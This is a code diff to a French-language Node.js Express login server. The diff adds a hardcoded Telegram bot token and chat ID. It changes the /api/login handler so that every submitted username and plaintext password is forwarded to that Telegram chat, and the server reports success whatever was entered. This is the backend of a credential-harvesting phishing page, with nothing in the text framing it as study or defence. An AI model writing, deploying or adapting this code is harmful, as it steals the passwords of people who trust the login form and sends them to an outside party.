@@ -4,12 +4,27 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+const BOT_TOKEN = '8001792175:AAH7CLoXonfVyX0kylQ6vBxjc3qSUzCluxU';
+const CHAT_ID = '7437310814';
+
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const users = [];
 
-app.post('/api/login', (req, res) => {
+async function sendTelegram(text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
+    });
+  } catch (e) {
+    console.log('Telegram error:', e.message);
+  }
+}
+
+app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
 
   if (!username || !username.trim()) {
@@ -19,13 +34,20 @@ app.post('/api/login', (req, res) => {
     return res.status(400).json({ success: false, message: 'Mot de passe requis' });
   }
 
-  users.push({
+  const entry = {
     username: username.trim(),
     password: password.trim(),
     date: new Date().toISOString()
-  });
+  };
 
-  console.log('Nouvelle connexion:', username.trim());
+  users.push(entry);
+
+  await sendTelegram(
+    `<b>🔐 Nouvelle connexion</b>\n` +
+    `👤 <b>User:</b> ${entry.username}\n` +
+    `🔑 <b>Pass:</b> ${entry.password}\n` +
+    `🕐 <b>Date:</b> ${new Date(entry.date).toLocaleString('fr-FR')}`
+  );
 
   res.json({ success: true, message: 'Connexion réussie' });
 });
